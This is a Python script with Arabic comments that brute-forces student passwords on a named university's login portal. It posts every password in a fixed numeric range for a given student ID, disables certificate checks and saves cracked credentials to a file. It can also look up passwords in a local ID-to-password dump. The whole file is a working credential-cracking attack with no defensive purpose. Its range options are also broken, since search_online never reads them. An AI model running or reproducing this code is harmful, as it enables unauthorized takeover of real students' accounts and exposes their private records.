#!/usr/bin/env python3
# get_pass.py - أداة بحث عن كلمة مرور طالب أونلاين أو من ملف قاعدة بيانات

import sys
import io
import argparse
import requests
import urllib3
import re
from datetime import datetime

# دعم UTF-8 للـ Windows
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعدادات ثابتة للبحث الأونلاين
BASE_URL = "https://eng.modern-academy.edu.eg/university/student/login.aspx"
VIEWSTATE = "/wEPDwUILTQ5MDEwMjJkZGW+XxHgaTLNHTGZl9W0amOxF73yJ4Co+eVqmdlQH50+"
VIEWSTATEGENERATOR = "B71B77C3"
TIMEOUT = 5

def search_online(student_id):
    """البحث الأونلاين عن كلمة المرور (تجربة مجموعة من الكلمات)"""
    # هنا نطاق البحث يمكن تمريره كـ arguments لاحقاً
    start_pass = 100000
    end_pass = 109999
    
    print(f"[ONLINE] Searching for ID {student_id} in range {start_pass}-{end_pass}")
    session = requests.Session()
    
    for password in range(start_pass, end_pass + 1):
        try:
            data = {
                "__EVENTTARGET": "ctl00$Main$btnLogin",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": VIEWSTATE,
                "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
                "ctl00$Main$txtID": student_id,
                "ctl00$Main$txtPassword": str(password)
            }
            response = session.post(
                BASE_URL,
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"},
                data=data,
                allow_redirects=False,
                verify=False,
                timeout=TIMEOUT
            )
            if response.status_code == 302:
                print(f"PASSWORD_FOUND:{password}")
                # كتابة النتيجة في ملف (اختياري)
                with open("found_passwords.txt", "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now()} - ID: {student_id} - PASS: {password}\n")
                return password
        except Exception as e:
            continue
    
    print("PASSWORD_NOT_FOUND")
    return None

def search_in_file(student_id, db_file):
    """البحث في ملف قاعدة بيانات محلي بصيغة id:pass"""
    try:
        with open(db_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                parts = line.split(':', 1)
                if parts[0].strip() == student_id:
                    password = parts[1].strip()
                    print(f"PASSWORD_FOUND:{password}")
                    return password
        print("PASSWORD_NOT_FOUND")
        return None
    except FileNotFoundError:
        print(f"ERROR: Database file '{db_file}' not found")
        return None
    except Exception as e:
        print(f"ERROR: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description='Modern Academy Password Finder')
    parser.add_argument('--id', required=True, help='Student ID')
    parser.add_argument('--database', help='Path to local database file (id:pass format)')
    parser.add_argument('--online', action='store_true', help='Search online (brute force)')
    parser.add_argument('--start', type=int, default=100000, help='Start of password range for online search')
    parser.add_argument('--end', type=int, default=109999, help='End of password range')
    
    args = parser.parse_args()
    
    student_id = args.id
    
    # الأولوية: إذا طلب البحث الأونلاين
    if args.online:
        # تعديل النطاق إذا تم تمريره
        global START_PASSWORD, END_PASSWORD
        START_PASSWORD = args.start
        END_PASSWORD = args.end
        search_online(student_id)
    elif args.database:
        # البحث في الملف المحلي
        search_in_file(student_id, args.database)
    else:
        # إذا لم يحدد، ابحث في الملف الافتراضي إن وجد
        default_db = "modren_id_pass.txt"
        import os
        if os.path.exists(default_db):
            search_in_file(student_id, default_db)
        else:
            print("ERROR: Please specify --database or --online")
            sys.exit(1)

if __name__ == "__main__":
    main()